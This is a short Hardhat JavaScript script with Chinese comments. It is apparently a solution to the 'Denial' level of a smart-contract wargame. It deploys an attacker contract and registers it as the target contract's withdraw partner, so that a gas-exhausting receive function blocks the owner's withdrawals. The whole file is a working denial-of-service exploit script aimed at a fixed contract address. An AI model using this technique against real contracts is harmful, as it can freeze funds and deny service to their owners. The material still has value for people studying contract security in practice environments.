const { ethers } = require("hardhat");
/*
* 拒绝服务攻击
实现方式：使用拒绝服务合约及receive, 通过耗尽gas费实现
*/

// Denial目标合约地址
const DenialAddress = "0x05e06a93558527f9e9dC392130098f973898c740";


// 部署攻击合约
async function DeployDenialHacker() {
    const [hacker] = await ethers.getSigners();
    const DenialHacker = await ethers.getContractFactory("DenialHacker"); // 获取合约工厂
    const denialHacker = await DenialHacker.connect(hacker).deploy(); // 部署合约
    await denialHacker.waitForDeployment(); // 等待部署完成

    console.log("DenialHacker deployed to:", await denialHacker.getAddress()); // 打印合约地址
    return await denialHacker.getAddress();
}


// 攻击脚本
async function DenialHackerScript() {
    const DenialHackerAddress = await DeployDenialHacker();

    // 加载目标合约
    const denial = await ethers.getContractAt("Denial", DenialAddress);

    // 调用DenialHackerAddress并传入攻击合约地址
    let tx = await denial.setWithdrawPartner(DenialHackerAddress);
    await tx.wait() 

    // 由owner进行提款，可在浏览器控制台操作
}

DenialHackerScript().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});